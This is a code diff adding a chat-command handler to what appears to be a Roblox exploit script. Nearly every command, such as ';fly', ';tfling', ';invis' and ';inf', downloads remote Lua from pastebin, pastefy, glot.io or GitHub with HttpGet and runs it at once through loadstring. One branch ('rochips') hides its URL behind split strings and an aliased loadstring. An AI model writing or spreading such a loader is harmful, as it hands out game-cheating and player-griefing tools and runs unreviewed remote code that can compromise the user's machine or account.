@@ -378,6 +378,85 @@ player.Chatted:Connect(function(message)
     end
 end)
 
+local cc
+cc = game.Players.LocalPlayer.Chatted:Connect(function(msg)
+    local spaceSplit = msg:split(" ")
+    if spaceSplit[1] == ";tptool" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Tptool/refs/heads/main/Tptool"))()
+    elseif spaceSplit[1] == ";jerk" then
+        loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
+        loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
+    elseif spaceSplit[1] == ";qcmd" then
+        loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
+    elseif spaceSplit[1] == ";knpc" then
+        loadstring(game:HttpGet("https://pastebin.com/raw/DcSXwXqC"))()
+    elseif spaceSplit[1] == ";hth" then
+        loadstring(game:HttpGet("https://pastefy.app/tI5b3OVD/raw"))()
+    elseif spaceSplit[1] == ";zomb" then
+        loadstring(game:HttpGet("https://pastefy.app/w7KnPY70/raw"))()
+    elseif spaceSplit[1] == ";fly" then
+        loadstring(game:HttpGet("https://pastefy.app/M0N30XXG/raw"))()
+    elseif spaceSplit[1] == ";fly2" then
+        loadstring(game:HttpGet("https://pastebin.com/raw/YSL3xKYU"))()
+    elseif spaceSplit[1] == ";tfling" then
+        loadstring(game:HttpGet("https://pastebin.com/raw/rfKaavP3"))()
+    elseif spaceSplit[1] == ";tfling2" then
+        loadstring(game:HttpGet("https://pastebin.com/raw/TXMNj1yy"))()
+    elseif spaceSplit[1] == ";avtor" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Avtor1zaTion/Avtor/main/AvtorHub"))()
+    elseif spaceSplit[1] == ";gh" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub"))()
+    elseif spaceSplit[1] == ";na2" then
+        loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Nameless-admin-14114"))()
+    elseif spaceSplit[1] == ";inf" then
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Infinite-Yield-Reborn-Legacy-21819"))()
+    elseif spaceSplit[1] == ";na1" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Silly-Exploiter/NamedAdmin/main/bamed%20admen.txt"))()
+    elseif spaceSplit[1] == ";le" then
+        loadstring(game:HttpGet("https://pastebin.com/raw/08QdLK2Y"))()
+    elseif spaceSplit[1] == ";bp1" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/BringFlingPlayers"))()
+    elseif spaceSplit[1] == ";bp2" then
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Better-Bring-Parts-Ui-SOLARA-and-Fixed-Lags-21780"))()
+    elseif spaceSplit[1] == ";bp3" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GoofyBlox/GoofyZ/refs/heads/main/Best/Vortex.lua"))()
+    elseif spaceSplit[1] == ";tel1" then
+        loadstring(game:HttpGet("https://rawscripts.net/raw/a-literal-baseplate.-FE-Telekinesis-15523"))()
+    elseif spaceSplit[1] == ";tel2" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty11.lua"))()
+    elseif spaceSplit[1] == ";glios" then
+        writefile(".nonecing", "white")
+        loadstring(game:HttpGet("https://glot.io/snippets/gua2ntmbdm/raw/main.lua"))()
+    elseif spaceSplit[1] == ";punch" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/fedoratums/Base-Script/Base-Script/fedoratum punch fling"))()
+    elseif spaceSplit[1] == ";akp1" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main"))()
+    elseif spaceSplit[1] == ";akp2" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Anti-kill-parts-updated-/refs/heads/main/Anti%20kill%20parts%20by%20Zephyr"))()
+    elseif spaceSplit[1] == ";tel3" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/sakupenXD/SakupScripts/main/Telekinesis"))()
+    elseif spaceSplit[1] == ";invis" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Luarmor123/community-Y-HUB/refs/heads/main/invisible-button"))()
+    elseif spaceSplit[1] == ";prox" then
+        for i, v in ipairs(game:GetService("Workspace"):GetDescendants()) do
+            if v.ClassName == "ProximityPrompt" then
+                v.HoldDuration = 0
+            end
+        end
+    elseif spaceSplit[1] == ";invis2" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudHub111/Scripts/refs/heads/main/Fe%20Invisible%20Beta"))()
+    elseif spaceSplit[1] == ";rochips" then
+        if "you wanna use rochips universal" then 
+            local z_x, z_z = "gzrux646yj/raw/main.ts", "https://glot.io/snippets/"
+            local im, lonely, z_c = task.wait, game, loadstring
+            z_c(lonely:HttpGet(z_z .. "" .. z_x))()
+            return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
+        end
+    else
+        print("wrong command")
+    end
+end)
+
 local notificationInfo = {
     Title = "Welcome!",
     Image = "",
